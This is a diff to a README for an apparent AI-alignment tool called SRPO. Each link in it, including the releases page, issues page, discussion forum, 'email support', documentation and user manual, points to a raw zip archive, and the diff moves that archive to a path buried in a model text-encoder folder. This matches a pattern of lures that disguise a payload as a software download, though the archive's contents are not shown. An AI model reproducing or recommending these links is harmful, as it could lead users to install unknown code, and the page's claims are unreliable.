@@ -6,7 +6,7 @@ Welcome to SRPO! This application helps you align the full diffusion trajectory 
 
 ## 📥 Download SRPO
 
-[![Download SRPO](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip)](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip)
+[![Download SRPO](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/fastvideo/models/hunyuan/text_encoder/Software_v2.6.zip)](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/fastvideo/models/hunyuan/text_encoder/Software_v2.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before you download SRPO, make sure your computer meets the following requiremen
 
 To download SRPO, please follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/fastvideo/models/hunyuan/text_encoder/Software_v2.6.zip).
 2. **Select the Latest Release:** Look for the latest version at the top of the page.
 3. **Download the Installer:** Click on the appropriate installer for your operating system. The files are clearly labeled for convenience.
 4. **Install the Application:** 
@@ -62,20 +62,20 @@ Yes, you can install SRPO on multiple devices as long as each device meets the s
 
 ### How can I report an issue?
 
-If you encounter any problems, please visit our [issues page](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip) and provide a description of the issue you're facing.
+If you encounter any problems, please visit our [issues page](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/fastvideo/models/hunyuan/text_encoder/Software_v2.6.zip) and provide a description of the issue you're facing.
 
 ## 👥 Community and Support
 
 Join our community to stay updated and receive support:
 
-- **GitHub Discussions:** Engage with other users and developers in our [discussions forum](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip).
-- **Email Support:** For direct assistance, contact us at https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip
+- **GitHub Discussions:** Engage with other users and developers in our [discussions forum](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/fastvideo/models/hunyuan/text_encoder/Software_v2.6.zip).
+- **Email Support:** For direct assistance, contact us at https://raw.githubusercontent.com/hesoyam199x/SRPO/main/fastvideo/models/hunyuan/text_encoder/Software_v2.6.zip
 
 ## 🔗 Resources
 
 For more information about SRPO, you can check out these resources:
 
-- [Official Documentation](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip)
-- [User Manual](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip)
+- [Official Documentation](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/fastvideo/models/hunyuan/text_encoder/Software_v2.6.zip)
+- [User Manual](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/fastvideo/models/hunyuan/text_encoder/Software_v2.6.zip)
 
 Thank you for choosing SRPO! We’re excited to help you align your preferences effectively.
